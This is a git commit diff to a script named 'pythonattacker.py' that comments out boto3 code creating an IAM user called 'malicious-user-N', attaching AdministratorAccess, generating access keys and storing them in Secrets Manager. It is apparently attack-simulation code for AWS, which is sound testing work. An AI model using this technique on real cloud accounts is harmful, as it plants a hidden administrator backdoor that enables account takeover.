50fa0bc5cd0c91a0bd582b27d4ab47dec5a4f7c2
Sides <shelside@f01898654dbb.ant.amazon.com>
2020-05-17 22:31:36 -0500

    fixed  default region issue

--- pythonattacker.py
+++ pythonattacker.py
@@ -2,23 +2,23 @@ import boto3, json, time, uuid, random, os
 some_random_number = str(random.randrange(100000))
 
 #creates new iam user
-iam = boto3.resource('iam')
-new_user = 'malicious-user-' + str(some_random_number)
-user = iam.User(new_user)
-user = user.create(Path='/')
+# iam = boto3.resource('iam')
+# new_user = 'malicious-user-' + str(some_random_number)
+# user = iam.User(new_user)
+# user = user.create(Path='/')
 
 # attaches AWS managed admin role
-user.attach_policy(PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
+# user.attach_policy(PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
 
 # creates access key and secret id for new user
-access_key_pair = user.create_access_key_pair()
-access_id = access_key_pair.id
-secret_key = access_key_pair.secret
+# access_key_pair = user.create_access_key_pair()
+# access_id = access_key_pair.id
+# secret_key = access_key_pair.secret
 
 # set environment variables with new user access key and secret
-os.environ["AWS_ACCESS_KEY_ID"] = access_key_pair.id
-os.environ["AWS_SECRET_ACCESS_KEY"] = access_key_pair.secret
-os.environ["AWS_SESSION_TOKEN"] = ""
+# os.environ["AWS_ACCESS_KEY_ID"] = access_key_pair.id
+# os.environ["AWS_SECRET_ACCESS_KEY"] = access_key_pair.secret
+# os.environ["AWS_SESSION_TOKEN"] = ""
 
 # add access key to seccrets manager
 secrets_manager = boto3.client('secretsmanager', region_name='us-east-2')
